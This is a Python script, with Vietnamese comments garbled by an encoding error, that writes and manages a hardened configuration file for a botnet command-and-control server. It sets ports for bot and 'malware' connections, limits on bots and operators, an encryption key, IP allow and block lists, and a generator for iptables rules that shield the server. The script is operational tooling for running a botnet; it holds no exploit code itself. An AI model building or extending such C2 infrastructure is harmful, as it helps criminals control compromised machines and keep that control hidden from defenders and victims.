#!/usr/bin/env python3
"""
Secure C2 Configuration - C·∫£i thi·ªán b·∫£o m·∫≠t cho C2 server
"""

import os
import json
import secrets
import ipaddress
from typing import Dict, List

class SecureC2Config:
    def __init__(self):
        self.config_file = "secure_botnet_config.json"
        self.default_config = {
            'c2_host': '127.0.0.1',  # Ch·ªâ bind localhost
            'c2_users_port': 22222,
            'c2_bots_port': 7777,
            'malware_port': 6666,
            'web_port': 5000,
            'max_users': 5,  # Gi·∫£m s·ªë users
            'max_bots': 50,  # Gi·∫£m s·ªë bots
            'encryption_key': secrets.token_hex(32),  # Random key
            'log_level': 'INFO',
            'security': {
                'require_authentication': True,
                'allowed_ips': [],  # IP whitelist
                'blocked_ips': [],
                'max_connections_per_ip': 3,
                'connection_timeout': 30,
                'enable_encryption': True,
                'enable_logging': True,
                'log_file': 'c2_security.log'
            }
        }
    
    def create_secure_config(self):
        """T·∫°o config b·∫£o m·∫≠t"""
        print("üîí Creating secure C2 configuration...")
        
        # Backup existing config
        if os.path.exists('botnet_config.json'):
            os.rename('botnet_config.json', 'botnet_config.json.backup')
            print("‚úÖ Backed up existing config")
        
        # Save secure config
        with open(self.config_file, 'w') as f:
            json.dump(self.default_config, f, indent=2)
        
        print(f"‚úÖ Secure config saved to {self.config_file}")
        print("üîë New encryption key generated")
        
        return self.config_file
    
    def add_trusted_ip(self, ip: str):
        """Th√™m IP ƒë√°ng tin c·∫≠y"""
        try:
            # Validate IP
            ipaddress.ip_address(ip)
            
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
            else:
                config = self.default_config.copy()
            
            if ip not in config['security']['allowed_ips']:
                config['security']['allowed_ips'].append(ip)
                
                with open(self.config_file, 'w') as f:
                    json.dump(config, f, indent=2)
                
                print(f"‚úÖ Added trusted IP: {ip}")
            else:
                print(f"‚ÑπÔ∏è  IP {ip} already in trusted list")
                
        except ValueError:
            print(f"‚ùå Invalid IP address: {ip}")
        except Exception as e:
            print(f"‚ùå Error adding IP: {e}")
    
    def block_ip(self, ip: str):
        """Block IP address"""
        try:
            # Validate IP
            ipaddress.ip_address(ip)
            
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
            else:
                config = self.default_config.copy()
            
            if ip not in config['security']['blocked_ips']:
                config['security']['blocked_ips'].append(ip)
                
                with open(self.config_file, 'w') as f:
                    json.dump(config, f, indent=2)
                
                print(f"üö´ Blocked IP: {ip}")
            else:
                print(f"‚ÑπÔ∏è  IP {ip} already blocked")
                
        except ValueError:
            print(f"‚ùå Invalid IP address: {ip}")
        except Exception as e:
            print(f"‚ùå Error blocking IP: {e}")
    
    def generate_firewall_rules(self):
        """Generate firewall rules"""
        rules = []
        rules.append("# C2 Server Firewall Rules")
        rules.append("# Generated by Secure C2 Config")
        rules.append("")
        
        # Allow localhost
        rules.append("# Allow localhost")
        rules.append("iptables -A INPUT -s 127.0.0.1 -j ACCEPT")
        rules.append("")
        
        # Allow trusted IPs
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                config = json.load(f)
            
            trusted_ips = config['security']['allowed_ips']
            if trusted_ips:
                rules.append("# Allow trusted IPs")
                for ip in trusted_ips:
                    rules.append(f"iptables -A INPUT -s {ip} -j ACCEPT")
                rules.append("")
        
        # Block suspicious IPs
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                config = json.load(f)
            
            blocked_ips = config['security']['blocked_ips']
            if blocked_ips:
                rules.append("# Block suspicious IPs")
                for ip in blocked_ips:
                    rules.append(f"iptables -A INPUT -s {ip} -j DROP")
                rules.append("")
        
        # Rate limiting
        rules.append("# Rate limiting")
        rules.append("iptables -A INPUT -p tcp --dport 7777 -m limit --limit 5/minute --limit-burst 10 -j ACCEPT")
        rules.append("iptables -A INPUT -p tcp --dport 7777 -j DROP")
        rules.append("")
        
        # Save rules
        with open('c2_firewall_rules.sh', 'w') as f:
            f.write('\n'.join(rules))
        
        print("‚úÖ Firewall rules generated: c2_firewall_rules.sh")
        print("üí° Run: sudo bash c2_firewall_rules.sh")
    
    def show_security_status(self):
        """Show security status"""
        print("üîí C2 Security Status")
        print("=" * 40)
        
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                config = json.load(f)
            
            print(f"üìÅ Config file: {self.config_file}")
            print(f"üåê C2 Host: {config['c2_host']}")
            print(f"üîê Authentication: {'‚úÖ Enabled' if config['security']['require_authentication'] else '‚ùå Disabled'}")
            print(f"üîí Encryption: {'‚úÖ Enabled' if config['security']['enable_encryption'] else '‚ùå Disabled'}")
            print(f"üìù Logging: {'‚úÖ Enabled' if config['security']['enable_logging'] else '‚ùå Disabled'}")
            print(f"‚úÖ Trusted IPs: {len(config['security']['allowed_ips'])}")
            print(f"üö´ Blocked IPs: {len(config['security']['blocked_ips'])}")
            
            if config['security']['allowed_ips']:
                print("\nüìã Trusted IPs:")
                for ip in config['security']['allowed_ips']:
                    print(f"  ‚úÖ {ip}")
            
            if config['security']['blocked_ips']:
                print("\nüö´ Blocked IPs:")
                for ip in config['security']['blocked_ips']:
                    print(f"  üö´ {ip}")
        else:
            print("‚ùå No secure config found")
            print("üí° Run: python3 secure_c2_config.py --create")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Secure C2 Configuration Manager")
    parser.add_argument('--create', action='store_true', help='Create secure config')
    parser.add_argument('--add-trusted', type=str, help='Add trusted IP')
    parser.add_argument('--block', type=str, help='Block IP address')
    parser.add_argument('--firewall', action='store_true', help='Generate firewall rules')
    parser.add_argument('--status', action='store_true', help='Show security status')
    
    args = parser.parse_args()
    
    config_manager = SecureC2Config()
    
    if args.create:
        config_manager.create_secure_config()
    elif args.add_trusted:
        config_manager.add_trusted_ip(args.add_trusted)
    elif args.block:
        config_manager.block_ip(args.block)
    elif args.firewall:
        config_manager.generate_firewall_rules()
    elif args.status:
        config_manager.show_security_status()
    else:
        print("üîí Secure C2 Configuration Manager")
        print("Use --help for available options")

if __name__ == "__main__":
    main()

